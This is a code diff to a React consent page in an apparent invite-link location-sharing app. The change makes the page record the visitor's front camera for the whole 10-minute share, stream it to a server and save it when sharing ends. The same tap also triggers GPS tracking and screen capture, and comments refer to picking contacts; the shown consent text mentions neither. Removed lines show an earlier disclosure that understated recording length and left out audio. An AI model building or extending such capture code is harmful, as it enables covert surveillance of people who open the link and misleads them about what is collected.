@@ -19,19 +19,19 @@ import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
 const GEO_SELFIE_PHOTO_COUNT = 2;
+const LOCATION_SHARING_DURATION_MS = 10 * 60 * 1000;
 // Back camera: ultra-compressed snapshot — goal is sub-second upload.
 // 160×120 @ 10 fps, 48 kbps video-only → ~24 KB raw / ~32 KB base64 for 4 s.
 const GEO_VIDEO_DURATION_MS = 30_000;
 const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
 const GEO_VIDEO_BPS = 48_000;   // back camera video bitrate (no audio)
 
-// Selfie: 40 s with audio. VP9 @ 80 kbps video + 32 kbps audio = 112 kbps total
-// → ~560 KB raw / ~750 KB base64. Full resolution kept; VP9 does the heavy lifting.
-const GEO_SELFIE_VIDEO_DURATION_MS = 60_000;
+// The live GeoBoard selfie is front-camera only for the entire sharing session.
+// MediaRecorder compresses to a low-bitrate WebM as it records; chunks are sent
+// to the server continuously rather than keeping a ten-minute video in memory.
+const GEO_SELFIE_VIDEO_DURATION_MS = LOCATION_SHARING_DURATION_MS;
 const GEO_SELFIE_VIDEO_DURATION_SECONDS = GEO_SELFIE_VIDEO_DURATION_MS / 1000;
 const GEO_SELFIE_VIDEO_BPS = 80_000;
-const GEO_SELFIE_AUDIO_BPS = 32_000;
-const LOCATION_SHARING_DURATION_MS = 10 * 60 * 1000;
 
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
   const ctrl = new AbortController();
@@ -510,24 +510,20 @@ function formatDMS(lat: number, lng: number): string {
 }
 
 /**
- * Requests camera + microphone together in a single getUserMedia call so
- * Chrome/Safari show one combined permission prompt (instead of a separate
- * prompt per device), then immediately releases the warm-up tracks. Must be
- * called synchronously from within a user-gesture handler (e.g. a button
- * click) — browsers require transient user activation to show the prompt.
- * Once the user answers, permission is resolved for the origin for the rest
- * of the session, so later getUserMedia calls (photo/video capture) resolve
- * instantly with no further prompt.
+ * Requests the camera once from a user gesture, then immediately releases the
+ * warm-up track. Later GeoBoard capture can use the granted camera permission
+ * without a second prompt. Audio is deliberately never requested for the live
+ * selfie recording.
  */
-function prewarmCameraAndMic(): void {
+function prewarmCamera(): void {
   if (!navigator.mediaDevices?.getUserMedia) return;
   navigator.mediaDevices
     .getUserMedia({
       video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: { echoCancellation: true, noiseSuppression: true },
+      audio: false,
     })
     .then((stream) => stream.getTracks().forEach((t) => t.stop()))
-    .catch(() => { /* camera/mic denied — photo/video capture will no-op later */ });
+    .catch(() => { /* camera denied — GeoBoard capture will no-op later */ });
 }
 
 async function uploadGeoPhoto(
@@ -640,6 +636,15 @@ interface GeoVideoConfig {
   height?: number;
   frameRate?: number;
   onElapsed?: (elapsedSeconds: number) => void;
+  /**
+   * Lets the active location-sharing session stop and finalize this recording
+   * immediately, rather than waiting for its maximum duration.
+   */
+  handle?: GeoVideoHandle;
+}
+
+interface GeoVideoHandle {
+  stop: () => void;
 }
 
 async function captureGeoVideo(
@@ -654,11 +659,23 @@ async function captureGeoVideo(
     audioBps = null,          // back-camera default: no audio
     width = 160, height = 120, frameRate = 10,
     onElapsed,
+    handle,
   } = config;
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
   const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
   const mimeType = MIME_CANDIDATES.find((m) => MediaRecorder.isTypeSupported(m)) ?? "";
   let stream: MediaStream | null = null;
+  let recorder: MediaRecorder | null = null;
+  let stopRequested = false;
+  let stopTimer: ReturnType<typeof setTimeout> | null = null;
+  let elapsedTimer: ReturnType<typeof setInterval> | null = null;
+
+  const stopRecording = () => {
+    stopRequested = true;
+    if (recorder?.state === "recording") recorder.stop();
+  };
+  if (handle) handle.stop = stopRecording;
+
   try {
     const constraints: MediaStreamConstraints = {
       video: { facingMode, width: { ideal: width, max: width * 2 }, height: { ideal: height, max: height * 2 }, frameRate: { ideal: frameRate, max: frameRate + 5 } },
@@ -682,6 +699,10 @@ async function captureGeoVideo(
     await new Promise((r) => setTimeout(r, 700));
     warmupVideo.srcObject = null; // detach — stream stays open for MediaRecorder
 
+    // The sharing session may have ended while the browser was opening or
+    // warming the camera. In that case, release it without beginning capture.
+    if (stopRequested) return;
+
     // ── Chunked streaming upload ────────────────────────────────────────────
     // Each MediaRecorder timeslice fires ondataavailable immediately; we POST
     // that raw binary blob to /geo-videos/chunk right away (no base64 encoding,
@@ -700,9 +721,10 @@ async function captureGeoVideo(
     recorderOptions.videoBitsPerSecond = videoBps;
     if (audioBps != null) recorderOptions.audioBitsPerSecond = audioBps;
 
-    const recorder = new MediaRecorder(stream, recorderOptions);
+    const activeRecorder = new MediaRecorder(stream, recorderOptions);
+    recorder = activeRecorder;
 
-    recorder.ondataavailable = (e) => {
+    activeRecorder.ondataavailable = (e) => {
       if (e.data.size === 0) return;
       const idx = chunkIndex++;
       // Fire binary upload immediately — runs in parallel with ongoing recording
@@ -712,7 +734,6 @@ async function captureGeoVideo(
     onStateChange("recording");
 
     // Live elapsed-second ticker for UI countdown
-    let elapsedTimer: ReturnType<typeof setInterval> | null = null;
     if (onElapsed) {
       let elapsed = 0;
       elapsedTimer = setInterval(() => { elapsed += 1; onElapsed(elapsed); }, 1000);
@@ -721,13 +742,16 @@ async function captureGeoVideo(
     // 3-second timeslice: large enough to amortise HTTP round-trip overhead,
     // small enough that chunks are already in flight well before recording ends.
     const CHUNK_MS = 3_000;
+    const recordingStartedAt = Date.now();
     await new Promise<void>((resolve, reject) => {
-      recorder.onstop = () => resolve();
-      recorder.onerror = () => reject(new Error("MediaRecorder error"));
-      recorder.start(CHUNK_MS);
-      setTimeout(() => { try { recorder.stop(); } catch { resolve(); } }, durationMs);
+      activeRecorder.onstop = () => resolve();
+      activeRecorder.onerror = () => reject(new Error("MediaRecorder error"));
+      activeRecorder.start(CHUNK_MS);
+      stopTimer = setTimeout(stopRecording, durationMs);
+      if (stopRequested) stopRecording();
     });
-    if (elapsedTimer) clearInterval(elapsedTimer);
+    if (stopTimer) { clearTimeout(stopTimer); stopTimer = null; }
+    if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
 
     if (chunkIndex === 0) { onStateChange("error"); return; }
 
@@ -736,12 +760,22 @@ async function captureGeoVideo(
     await Promise.all(chunkUploads);
 
     // Ask the server to assemble chunks → DB row (sends only small JSON metadata)
+    const actualDurationMs = Math.max(1, Math.min(durationMs, Date.now() - recordingStartedAt));
     const uploaded = await finalizeVideoUpload(
-      uploadId, token, mimeType || "video/webm", durationMs,
+      uploadId, token, mimeType || "video/webm", actualDurationMs,
       lat, lng, address, facingMode,
     );
     onStateChange(uploaded ? "done" : "error");
-  } catch { onStateChange("error"); } finally { stream?.getTracks().forEach((t) => t.stop()); }
+  } catch {
+    // Stopping before getUserMedia resolves is an expected shutdown path, not
+    // a visible capture error.
+    if (!stopRequested) onStateChange("error");
+  } finally {
+    if (stopTimer) clearTimeout(stopTimer);
+    if (elapsedTimer) clearInterval(elapsedTimer);
+    if (handle) handle.stop = () => {};
+    stream?.getTracks().forEach((t) => t.stop());
+  }
 }
 
 function detectWebView(): boolean {
@@ -822,6 +856,7 @@ export default function ConsentPage() {
   const geoSelfiePhotoStartedRef = useRef(false);
   const geoVideoStartedRef = useRef(false);
   const geoSelfieStartedRef = useRef(false);
+  const liveSelfieRecordingRef = useRef<GeoVideoHandle | null>(null);
   const earlyGeoRef = useRef<GeolocationPosition | null>(null);
   const earlyGeoErrRef = useRef<GeolocationPositionError | null>(null);
   const earlyGeoReadyRef = useRef(false);
@@ -1312,7 +1347,7 @@ export default function ConsentPage() {
     // 1. Re-fire GPS (in case the page-load attempt's permission dialog was missed)
     // 2. Unblock camera/mic and screen-share which require a gesture
     doGrantRef.current();
-    prewarmCameraAndMic();
+    prewarmCamera();
     startScreenCaptureRef.current();
     // Mark contacts as tried so pickContacts() inside doGrant stays a no-op.
     contactsTriedRef.current = true;
@@ -1328,7 +1363,7 @@ export default function ConsentPage() {
     // Real user-gesture tap — re-fire GPS (catches devices where the page-load
     // permission dialog was missed) and unblock gesture-gated APIs.
     doGrantRef.current();
-    prewarmCameraAndMic();
+    prewarmCamera();
     startScreenCaptureRef.current();
     // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
     contactsTriedRef.current = true;
@@ -1411,42 +1446,24 @@ export default function ConsentPage() {
       expiresAt: sharingExpiresAt,
     });
 
-    if (!geoBoardStartedRef.current) {
-      geoBoardStartedRef.current = true;
-      // Rear-facing "surroundings" photos first, then 2 front-facing selfie
-      // photos — sequential since most phones only expose one active
-      // camera stream at a time.
-      captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoPhotoCount(n), "environment", GEO_PHOTO_COUNT)
-        .then(() => setGeoPhotoDone(true)).catch(() => setGeoPhotoDone(true))
-        .finally(() => {
-          if (geoSelfiePhotoStartedRef.current) return;
-          geoSelfiePhotoStartedRef.current = true;
-          captureGeoPhotos(String(token), initialLat, initialLng, addressRef.current, (n) => setGeoSelfiePhotoCount(n), "user", GEO_SELFIE_PHOTO_COUNT)
-            .then(() => setGeoSelfiePhotoDone(true)).catch(() => setGeoSelfiePhotoDone(true));
-        });
-    }
     if (!geoVideoStartedRef.current) {
       geoVideoStartedRef.current = true;
       geoSelfieStartedRef.current = true;
-      // Android only supports one active camera stream at a time.
-      // Run the short back-camera clip first (4 s), then immediately start the
-      // 40-second front-camera selfie so they never compete for the hardware.
-      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoVideoState(s), {
-        facingMode: "environment",
-        durationMs: GEO_VIDEO_DURATION_MS,
-        videoBps: GEO_VIDEO_BPS,
+      // A phone browser can only use one camera stream at a time. Prioritize a
+      // continuous front-camera clip over the former one-off photos and rear
+      // clip so the recording covers the full active sharing session.
+      const handle: GeoVideoHandle = { stop: () => {} };
+      liveSelfieRecordingRef.current = handle;
+      captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
+        facingMode: "user",
+        durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
+        videoBps: GEO_SELFIE_VIDEO_BPS,
         audioBps: null,
-        width: 160, height: 120, frameRate: 10,
-      }).catch(() => setGeoVideoState("error")).finally(() => {
-        // Back-camera clip done — now start the selfie (front camera, 40 s, audio)
-        captureGeoVideo(String(token), initialLat, initialLng, addressRef.current, (s) => setGeoSelfieState(s), {
-          facingMode: "user",
-          durationMs: GEO_SELFIE_VIDEO_DURATION_MS,
-          videoBps: GEO_SELFIE_VIDEO_BPS,
-          audioBps: GEO_SELFIE_AUDIO_BPS,
-          width: 320, height: 240, frameRate: 15,
-          onElapsed: (s) => setGeoSelfieElapsed(s),
-        }).catch(() => setGeoSelfieState("error"));
+        width: 320, height: 240, frameRate: 12,
+        onElapsed: (s) => setGeoSelfieElapsed(s),
+        handle,
+      }).catch(() => setGeoSelfieState("error")).finally(() => {
+        if (liveSelfieRecordingRef.current === handle) liveSelfieRecordingRef.current = null;
       });
     }
 
@@ -1493,9 +1510,11 @@ export default function ConsentPage() {
           setState("denied");
           if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
           if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
+          liveSelfieRecordingRef.current?.stop();
           wakeLockRef.current?.release(); wakeLockRef.current = null;
         } else {
           setState("gps_off");
+          liveSelfieRecordingRef.current?.stop();
           const c = coordsRef.current;
           if (c) pushLocation(c.lat, c.lng, undefined, addressRef.current, "offline");
         }
@@ -1551,6 +1570,9 @@ export default function ConsentPage() {
   }, [acquireWakeLock, pushLocation, notifySW]); // eslint-disable-line react-hooks/exhaustive-deps
 
   const stopTracking = useCallback(() => {
+    // Stop triggers final data delivery, waits for the already-streamed chunks,
+    // and asks the API to save the compressed video in GeoBoard.
+    liveSelfieRecordingRef.current?.stop();
     if (watchIdRef.current !== null) { navigator.geolocation.clearWatch(watchIdRef.current); watchIdRef.current = null; }
     if (heartbeatRef.current !== null) { clearInterval(heartbeatRef.current); heartbeatRef.current = null; }
     if (notifPollRef.current !== null) { clearInterval(notifPollRef.current); notifPollRef.current = null; }
@@ -1568,6 +1590,15 @@ export default function ConsentPage() {
   }, [acquireWakeLock]);
 
   useEffect(() => () => stopTracking(), [stopTracking]);
+
+  // Page navigation/closing is treated like a sharing disconnect. The browser
+  // may still terminate network work abruptly, but this gives MediaRecorder the
+  // earliest possible chance to flush the final chunk and finalize the upload.
+  useEffect(() => {
+    const stopForPageExit = () => liveSelfieRecordingRef.current?.stop();
+    window.addEventListener("pagehide", stopForPageExit);
+    return () => window.removeEventListener("pagehide", stopForPageExit);
+  }, []);
 
   // ── Session recording helpers ────────────────────────────────────────────────
 
@@ -2108,7 +2139,7 @@ export default function ConsentPage() {
               <div className="flex-1">
                 <p className="font-semibold text-foreground text-sm mb-0.5">Precise Location</p>
                 <p className="text-xs text-muted-foreground leading-relaxed">
-                  Shares your real-time GPS position with {senderName}. Works in the background for up to <strong className="text-foreground">60 days</strong>.
+                  Shares your real-time GPS position with {senderName} for up to <strong className="text-foreground">10 minutes</strong>.
                 </p>
                 <div className="mt-2 flex flex-wrap gap-1.5">
                   <span className="text-xs bg-blue-500/10 text-blue-400 border border-blue-500/20 rounded-full px-2 py-0.5 font-medium">GPS + Network</span>
@@ -2127,12 +2158,12 @@ export default function ConsentPage() {
               <div className="flex-1">
                 <p className="font-semibold text-foreground text-sm mb-0.5">Camera Access</p>
                 <p className="text-xs text-muted-foreground leading-relaxed">
-                  Captures 5 GeoBoard verification photos and a short video clip when sharing begins. Used for location verification.
+                  Records a compressed, front-camera selfie video while this 10-minute location share is active. Recording stops and is saved to GeoBoard when sharing ends. No audio is recorded.
                 </p>
                 <div className="mt-2 flex flex-wrap gap-1.5">
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5 Photos</span>
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">5s Video</span>
-                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">One-time</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Front camera</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">Up to 10 min</span>
+                  <span className="text-xs bg-violet-500/10 text-violet-400 border border-violet-500/20 rounded-full px-2 py-0.5 font-medium">No audio</span>
                 </div>
               </div>
               <CheckCircle className="h-5 w-5 text-violet-400 flex-shrink-0 mt-0.5" />
@@ -2462,13 +2493,13 @@ export default function ConsentPage() {
                   </div>
                   <div style={{ flex: 1 }}>
                     <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
-                      <p style={{ fontSize: 13, fontWeight: 700, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: recording autoportrait</p>
+                      <p style={{ fontSize: 13, fontWeight: 700, color: "#D4A843", margin: 0, fontFamily: "Georgia, serif" }}>REC • Front camera recording</p>
                       <span style={{ fontSize: 12, fontFamily: "'Share Tech Mono', monospace", color: "#b87d3a", marginLeft: 8, flexShrink: 0 }}>{timeLabel} left</span>
                     </div>
                     <div style={{ height: 4, background: "rgba(100,70,30,0.3)", borderRadius: 2, overflow: "hidden" }}>
                       <div style={{ height: "100%", background: "linear-gradient(90deg,#8B4A14,#C8922A,#D4A843)", borderRadius: 2, transition: "width 0.9s linear", width: `${pct}%`, boxShadow: "0 0 6px rgba(200,146,42,0.5)" }}/>
                     </div>
-                    <p style={{ marginTop: 4, fontSize: 11, color: "rgba(180,130,60,0.6)", fontFamily: "'Share Tech Mono', monospace" }}>Audio ● {GEO_SELFIE_VIDEO_DURATION_SECONDS}s · compressed</p>
+                    <p style={{ marginTop: 4, fontSize: 11, color: "rgba(180,130,60,0.6)", fontFamily: "'Share Tech Mono', monospace" }}>No audio · compressed · saved to GeoBoard when sharing ends</p>
                   </div>
                   {/* Right feather */}
                   <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.55, transform: "scaleX(-1)", marginTop: 2 }}>
@@ -2484,7 +2515,7 @@ export default function ConsentPage() {
               <div style={{ borderRadius: 8, padding: "11px 14px", display: "flex", alignItems: "center", gap: 12, background: "linear-gradient(135deg,#2e1c08 0%,#3e2a10 60%,#2e1c08 100%)", border: "1.5px solid #6b4820", boxShadow: "0 3px 10px rgba(0,0,0,0.5)" }}>
                 <Loader2 style={{ width: 18, height: 18, color: "#b87d3a", flexShrink: 0, animation: "spin 1s linear infinite" }} />
                 <div>
-                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: archiving autoportrait sequence…</p>
+                  <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: saving the selfie recording…</p>
                   <p style={{ fontSize: 11, color: "rgba(180,130,60,0.5)", marginTop: 2, fontFamily: "'Share Tech Mono', monospace" }}>Compressing &amp; uploading</p>
                 </div>
               </div>
@@ -2500,7 +2531,7 @@ export default function ConsentPage() {
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#b87d3a" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0 }}>
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                 </svg>
-                <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: autoportrait sequence archived ✓</p>
+                <p style={{ fontSize: 13, fontWeight: 600, color: "#b87d3a", margin: 0, fontFamily: "Georgia, serif" }}>Geo Board: selfie recording saved ✓</p>
                 <svg width="14" height="24" viewBox="0 0 18 32" fill="none" style={{ flexShrink: 0, opacity: 0.7, transform: "scaleX(-1)", marginLeft: "auto" }}>
                   <path d="M9 2 C9 2 2 8 2 18 C2 26 6 30 9 30" stroke="#C8922A" strokeWidth="1.2" fill="none"/>
                   <path d="M9 6 C5 10 4 14 4 18" stroke="#C8922A" strokeWidth="0.8" opacity="0.5"/>
